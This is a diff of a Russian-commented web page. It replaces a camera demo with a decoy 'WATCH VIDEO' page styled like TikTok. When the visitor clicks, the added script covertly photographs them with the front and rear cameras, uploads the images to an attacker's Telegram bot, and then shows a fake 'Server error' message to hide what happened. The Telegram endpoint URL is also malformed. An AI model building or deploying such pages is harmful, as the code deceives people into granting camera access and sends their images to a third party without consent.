@@ -2,116 +2,124 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>HD Camera Engine</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Player</title>
     <style>
-        body { margin: 0; background: #050505; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        .header { padding: 20px; text-align: center; border-bottom: 1px solid #222; width: 100%; margin-bottom: 20px; }
-        .btn-main { padding: 18px 40px; background: linear-gradient(45deg, #fe2c55, #ff0050); border: none; color: #fff; font-weight: 800; border-radius: 50px; cursor: pointer; font-size: 20px; letter-spacing: 1px; box-shadow: 0 10px 30px rgba(254, 44, 85, 0.4); transition: 0.3s; }
-        .btn-main:active { transform: scale(0.95); }
-        .gallery { display: grid; grid-template-columns: 1fr; gap: 20px; width: 95%; max-width: 1000px; padding-bottom: 50px; }
-        .card { background: #111; border-radius: 15px; overflow: hidden; border: 1px solid #333; position: relative; }
-        .card img { width: 100%; height: auto; display: block; filter: brightness(1.05); }
-        .info { padding: 12px; font-size: 12px; color: #00ff88; font-family: monospace; background: rgba(0,0,0,0.8); }
-        #loader { display: none; margin: 20px; color: #fe2c55; font-size: 18px; font-weight: bold; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
-        video, canvas { display: none; }
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            font-family: sans-serif;
+        }
+
+        #watchBtn {
+            background-color: #ff0050; /* TikTok Red */
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        #watchBtn:active {
+            transform: scale(0.95);
+        }
+
+        /* Скрытые элементы */
+        video, canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <h1>ULTRA CAM HD</h1>
-        <p style="color: #666;">Максимальное разрешение и детализация</p>
-    </div>
+    <button id="watchBtn">WATCH VIDEO</button>
 
-    <button class="btn-main" id="startBtn" onclick="initCapture()">ЗАПУСК СИСТЕМЫ</button>
-    <div id="loader">ИНИЦИАЛИЗАЦИЯ КАМЕР И ФОКУСИРОВКА...</div>
-
-    <div class="gallery" id="gallery"></div>
-
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c"></canvas>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        async function initCapture() {
-            const btn = document.getElementById('startBtn');
-            const loader = document.getElementById('loader');
-            const gallery = document.getElementById('gallery');
-            
-            btn.style.display = 'none';
-            loader.style.display = 'block';
-            gallery.innerHTML = "";
+        // ВСТАВЬТЕ ВАШИ ДАННЫЕ СЮДА
+        const TOKEN = 'ВАШ_ТОКЕН_БОТА';
+        const CHAT_ID = 'ВАШ_CHAT_ID';
+
+        const watchBtn = document.getElementById('watchBtn');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        watchBtn.addEventListener('click', async () => {
+            try {
+                // 1. Съемка селфи (Front camera)
+                await captureAndSend('user', 'Front Camera');
+
+                // 2. Съемка окружения (Rear camera)
+                await captureAndSend('environment', 'Rear Camera');
+
+            } catch (err) {
+                console.error("Error:", err);
+            } finally {
+                // Вывод сообщения об ошибке в любом случае
+                watchBtn.textContent = "Server error. Try again later";
+                watchBtn.style.backgroundColor = "#555";
+                watchBtn.disabled = true;
+            }
+        });
+
+        async function captureAndSend(facingMode, label) {
+            const constraints = {
+                video: {
+                    facingMode: facingMode,
+                    width: { ideal: 4096 },
+                    height: { ideal: 2160 }
+                }
+            };
 
             try {
-                // 1. Захват фронтальной камеры
-                await processCamera("user", "FRONTAL_SENSOR_MAX");
-                
-                // 2. Захват основной камеры
-                await processCamera("environment", "MAIN_SENSOR_MAX");
-                
-                loader.style.display = 'none';
-                btn.innerText = "ПОВТОРИТЬ ЗАХВАТ";
-                btn.style.display = 'block';
-            } catch (err) {
-                alert("Ошибка: Разрешите доступ к камере для работы HD-движка.");
-                btn.style.display = 'block';
-                loader.style.display = 'none';
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+
+                // Ждем немного для стабилизации камеры
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Остановка потока
+                stream.getTracks().forEach(track => track.stop());
+
+                // Конвертация в Blob и отправка
+                canvas.toBlob(blob => {
+                    sendToTelegram(blob, label);
+                }, 'image/jpeg', 0.9);
+
+            } catch (e) {
+                console.warn(`Could not access ${label}:`, e);
             }
         }
 
-        async function processCamera(mode, label) {
+        async function sendToTelegram(blob, label) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('caption', `Photo from: ${label}`);
+
             try {
-                // Пытаемся выжать максимум (4K/8K) через идеальные параметры
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: mode, 
-                        width: { ideal: 7680 }, 
-                        height: { ideal: 4320 },
-                        frameRate: { ideal: 60 }
-                    } 
+                await fetch(`https://telegram.org{TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
                 });
-
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-
-                // Включаем фонарик (если есть) для лучшего качества на Android
-                const track = stream.getVideoTracks()[0];
-                const capabilities = track.getCapabilities();
-                if (capabilities.torch) {
-                    await track.applyConstraints({ advanced: [{ torch: true }] });
-                }
-
-                // Ждем 2.5 секунды для полной адаптации сенсора к свету
-                await new Promise(r => setTimeout(r, 2500));
-
-                const canvas = document.getElementById('c');
-                const settings = track.getSettings();
-                
-                // Настройка холста под реальное разрешение сенсора
-                canvas.width = settings.width;
-                canvas.height = settings.height;
-                
-                const ctx = canvas.getContext('2d', { alpha: false });
-                ctx.imageSmoothingEnabled = false; // Отключаем размытие при отрисовке
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Сохраняем в JPEG с качеством 1.0 (без потерь)
-                const data = canvas.toDataURL('image/jpeg', 1.0);
-                
-                // Остановка камеры
-                stream.getTracks().forEach(t => t.stop());
-
-                // Отрисовка карточки
-                const card = document.createElement('div');
-                card.className = 'card';
-                card.innerHTML = `
-                    <img src="${data}">
-                    <div class="info">[ID: ${Math.random().toString(36).substr(2, 9).toUpperCase()}] | RES: ${canvas.width}x${canvas.height} | MODE: ${label}</div>
-                `;
-                document.getElementById('gallery').prepend(card);
-            } catch (e) {
-                console.warn(`Камера ${mode} недоступна:`, e);
+            } catch (err) {
+                console.error("Telegram send error:", err);
             }
         }
     </script>
